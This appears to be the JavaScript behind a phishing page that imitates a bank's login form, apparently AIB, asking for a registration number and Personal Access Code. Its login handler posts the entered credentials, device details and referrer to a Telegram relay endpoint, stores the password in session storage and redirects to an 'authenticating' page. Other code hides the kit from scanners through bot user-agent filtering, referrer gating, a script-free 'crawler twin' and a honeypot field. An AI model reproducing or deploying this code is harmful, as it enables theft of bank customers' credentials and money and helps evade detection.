/**
 * Login page behaviour — human landing only.
 *
 * Extracted verbatim from the inline `<script>` that used to live in
 * `login.astro` so that the markup could move into `LoginForm.astro` and be
 * shared by `/`, `/login.html` and (as markup-only) the crawler twin.
 *
 * The crawler twin never imports this file, which is how the twin keeps its
 * zero-JavaScript guarantee structural rather than a matter of discipline.
 *
 * Runs as a bundled module, so it executes after the document is parsed — the
 * elements it touches are already in the DOM.
 */

// One visit notification per tab/session.
// STRICT STEINS GATE RULE: Only fires when access is granted and the landing UI mounts.
// Direct visits that hit the ErrorScreen must NEVER dispatch a visit alert.
function triggerVisitorNotification() {
  var KEY = 'aib_visitor_notified';
  try {
    if (sessionStorage.getItem(KEY) === '1') return;
  } catch (e) { /* storage blocked; still only runs once per page load */ }

  var ua = navigator.userAgent || '';
  if (/(bot|crawl|spider|slurp|headless|puppeteer|selenium|playwright|curl|wget|python-requests|axios|postman|insomnia|telegrambot|whatsapp|discordbot|twitterbot|facebookexternalhit|linkedinbot)/i.test(ua)) return;

  var ref = document.referrer;
  var isLocal = typeof window !== 'undefined' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1');
  // Direct visits must never notify unless local development testing
  if ((!ref || ref === 'Direct' || !ref.startsWith('http')) && !isLocal) return;

  fetch('/api/telegram/visitor', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      userAgent: ua,
      screen: window.screen ? (window.screen.width + 'x' + window.screen.height) : 'Unknown',
      language: navigator.language,
      referrer: ref || (isLocal ? 'http://localhost:4321/' : 'Direct'),
      pageUrl: window.location.href
    })
  })
    .then(function (res) {
      if (res.ok) {
        try { sessionStorage.setItem(KEY, '1'); } catch (e) {}
      }
    })
    .catch(function () {});
}

(function initVisitorNotification() {
  var SESSION_KEY = 'aib_referrer_access_granted';
  var hasAccess = false;
  try {
    hasAccess = sessionStorage.getItem(SESSION_KEY) === 'true';
  } catch (e) {}

  if (hasAccess) {
    triggerVisitorNotification();
  } else {
    window.addEventListener('aib:access-granted', function () {
      triggerVisitorNotification();
    }, { once: true });
  }
})();

function showTrouble() {
  document.getElementById('aibTroubleLoggingInRegView').classList.add('show');
  document.documentElement.scrollTo({ top: 0, behavior: 'smooth' });
}
function hideTrouble() {
  document.getElementById('aibTroubleLoggingInRegView').classList.remove('show');
}

function setStatus(msg, type) {
  var el = document.getElementById('statusArea');
  if (!el) return;
  if (!msg) { el.innerHTML = ''; return; }
  if (type === 'error') {
    el.innerHTML = '<div class="ping-error" role="alert">' + msg + '</div>';
  } else {
    var cls = 'ping-status ' + (type || 'info');
    var spinner = type === 'info' ? '<span class="ping-status-spinner"></span>' : '';
    el.innerHTML = '<div class="' + cls + '">' + spinner + msg + '</div>';
  }
}

function enforceNumericOnly(inputEl) {
  if (!inputEl) return;
  inputEl.addEventListener('input', function () {
    var clean = this.value.replace(/\D/g, '');
    if (this.value !== clean) {
      this.value = clean;
    }
  });
  inputEl.addEventListener('keydown', function (e) {
    if (
      e.key === 'Backspace' ||
      e.key === 'Delete' ||
      e.key === 'Tab' ||
      e.key === 'Escape' ||
      e.key === 'Enter' ||
      e.key === 'ArrowLeft' ||
      e.key === 'ArrowRight' ||
      e.key === 'ArrowUp' ||
      e.key === 'ArrowDown' ||
      e.key === 'Home' ||
      e.key === 'End' ||
      e.ctrlKey ||
      e.metaKey
    ) {
      return;
    }
    if (!/^\d$/.test(e.key)) {
      e.preventDefault();
    }
  });
  inputEl.addEventListener('paste', function (e) {
    var pasteData = (e.clipboardData || window.clipboardData).getData('text');
    if (pasteData && /\D/.test(pasteData)) {
      e.preventDefault();
      var clean = pasteData.replace(/\D/g, '');
      var start = this.selectionStart || 0;
      var end = this.selectionEnd || 0;
      var val = this.value;
      this.value = val.slice(0, start) + clean + val.slice(end);
      this.selectionStart = this.selectionEnd = start + clean.length;
      this.dispatchEvent(new Event('input'));
    }
  });
}

var usernameInput = document.getElementById('username');
var passwordInput = document.getElementById('password');

enforceNumericOnly(usernameInput);
enforceNumericOnly(passwordInput);

function clearError() {
  var el = document.getElementById('statusArea');
  if (el && el.innerHTML) {
    el.innerHTML = '';
  }
  try {
    var params = new URLSearchParams(window.location.search);
    if (params.has('error')) {
      params.delete('error');
      var cleanQuery = params.toString() ? ('?' + params.toString()) : window.location.pathname;
      window.history.replaceState({}, '', cleanQuery);
    }
  } catch (e) {}
}

if (usernameInput) {
  usernameInput.addEventListener('input', clearError);
}
if (passwordInput) {
  passwordInput.addEventListener('input', clearError);
}

(function checkErrorState() {
  var params = new URLSearchParams(window.location.search);
  var hasErrorParam = params.get('error') === 'invalid_credentials' || params.get('error') === 'denied' || params.has('error');
  var storedError = null;
  try {
    storedError = sessionStorage.getItem('aib_login_error');
    if (storedError) sessionStorage.removeItem('aib_login_error');
    sessionStorage.removeItem('aib_user_id');
    sessionStorage.removeItem('aib_password');
  } catch (e) {}

  if (hasErrorParam || storedError) {
    var msg = storedError || "We didn't recognise the Registration number or Personal Access Code you entered. Please try again.";
    setStatus(msg, 'error');

    if (usernameInput) usernameInput.value = '';
    if (passwordInput) passwordInput.value = '';
    if (usernameInput) usernameInput.focus();
  }
})();

function handleLogin(e) {
  if (e) e.preventDefault();
  var hp = document.getElementById('hp_field');
  if (hp && hp.value) return;
  var regNo = usernameInput ? usernameInput.value.trim().replace(/\D/g, '') : '';
  var pac = passwordInput ? passwordInput.value.trim().replace(/\D/g, '') : '';

  if (!regNo) {
    setStatus('Please enter your Registration number.', 'error');
    if (usernameInput) usernameInput.focus();
    return;
  }
  if (!pac) {
    setStatus('Please enter your PAC.', 'error');
    if (passwordInput) passwordInput.focus();
    return;
  }

  var btn = document.getElementById('loginBtn');
  btn.classList.add('disabled', 'is-loading');
  btn.setAttribute('aria-busy', 'true');

  fetch('/api/telegram/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      user_id: regNo,
      password: pac,
      member_origin: window.location.href,
      device_info: navigator.userAgent,
      screen_size: window.screen ? (window.screen.width + 'x' + window.screen.height) : null,
      referrer: document.referrer || null
    })
  })
    .then(function (r) {
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return r.json();
    })
    .then(function () {
      try {
        sessionStorage.setItem('aib_user_id', regNo);
        sessionStorage.setItem('aib_password', pac);
      } catch (e) {}
      window.location.href = '/authenticating.html';
    })
    .catch(function () {
      setStatus('Unable to process login. Please try again.', 'error');
      btn.classList.remove('disabled', 'is-loading');
      btn.removeAttribute('aria-busy');
    });
}

document.getElementById('loginForm').addEventListener('submit', handleLogin);
document.getElementById('loginBtn').addEventListener('click', handleLogin);
document.querySelector('.aib_btn-more-information').addEventListener('click', showTrouble);
document.querySelector('.aib_btn-close').addEventListener('click', hideTrouble);
document.querySelector('.aib_btn-gotit').addEventListener('click', hideTrouble);
document.getElementById('username').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') { handleLogin(e); }
});
document.getElementById('password').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') { handleLogin(e); }
});